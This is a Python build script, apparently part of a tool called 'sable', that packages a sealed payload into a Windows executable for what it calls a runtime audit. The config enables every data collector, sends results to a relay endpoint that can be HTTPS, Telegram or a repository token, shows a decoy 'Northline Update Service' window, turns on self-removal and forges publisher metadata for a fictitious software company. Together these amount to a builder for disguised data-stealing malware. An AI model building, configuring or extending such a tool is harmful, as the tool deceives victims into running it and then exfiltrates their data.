"""Build the artifact used for the runtime half of the audit.

The build-side matrix already proved the form, the container and the seal. This one is
configured for a live run on the clean VM: a LAN endpoint, a decoy dialog with a known
title and duration, self-removal on, and every collector on. Nothing here is a second
implementation — it is ``forge.payload``, ``seal.seal`` and ``forge.build`` in the same
order ``core.pipeline`` calls them.

    python runtime_build.py http://192.168.1.151:8098/drop _out/live/SableRuntime.exe
"""

from __future__ import annotations

import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
ROOT = HERE.parent / "sable"
sys.path.insert(0, str(ROOT))

from core import forge, seal  # noqa: E402
from core.schema import (  # noqa: E402
    SCHEMA_VERSION,
    RelayConfig,
    RunConfig,
    SourceConfig,
    VersionConfig,
)

STUB = ROOT / "tools" / "dist" / "sable-launcher.exe"
SEAL_KEY = "bench-laptop-v1"

ENDPOINT = sys.argv[1] if len(sys.argv) > 1 else "http://192.168.1.151:8098/drop"
DESTINATION = Path(sys.argv[2] if len(sys.argv) > 2 else HERE / "_out" / "live" / "SableRuntime.exe")
DECOY_SECONDS = int(sys.argv[3]) if len(sys.argv) > 3 else 8
# https | telegram | link | phantom. The endpoint shape follows the kind: a URL, a
# ``token$chat``, or an ``owner/repo$token``. One builder for every channel, because the
# only thing that changes is which two strings go into the config.
KIND = sys.argv[4] if len(sys.argv) > 4 else "https"
DECOY_TITLE = "Northline Update Service"
DECOY_TEXT = "Preparing Northline components. This window closes itself."


def main() -> int:
    cfg = RunConfig(
        schema_version=SCHEMA_VERSION,
        mutex=r"Global\SableRuntimeAudit",
        seal_key=SEAL_KEY,
        relay=RelayConfig(kind=KIND, endpoint=ENDPOINT),
        sources=SourceConfig(),
        self_remove=True,
        ballast_mb=0,
        keep_local=False,
        persist=False,
        decoy_seconds=DECOY_SECONDS,
        decoy_title=DECOY_TITLE,
        decoy_text=DECOY_TEXT,
        version=VersionConfig(
            company="Northline Software Ltd",
            product="Northline Update Service",
            description="Keeps Northline components current.",
            copyright="(c) Northline Software Ltd",
            original_name=DESTINATION.name,
            file_version="6.2.9.441",
            product_version="6.2.9.441",
        ),
    )

    archive = forge.payload(ROOT, cfg)
    print(f"payload        {len(archive):,} bytes")
    sealed = seal.seal(archive, cfg.seal_key)
    print(f"sealed         {len(sealed):,} bytes")
    if not STUB.is_file():
        raise SystemExit(f"stub missing: {STUB}")

    DESTINATION.parent.mkdir(parents=True, exist_ok=True)
    forge.build(cfg, sealed, DESTINATION, mode="exe", stub=STUB)
    print(f"artifact       {DESTINATION}  {DESTINATION.stat().st_size:,} bytes")
    print(f"relay          {KIND} | {len(ENDPOINT)} chars")
    print(f"decoy          {DECOY_SECONDS} s | {DECOY_TITLE!r}")
    print(f"self_remove    True")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
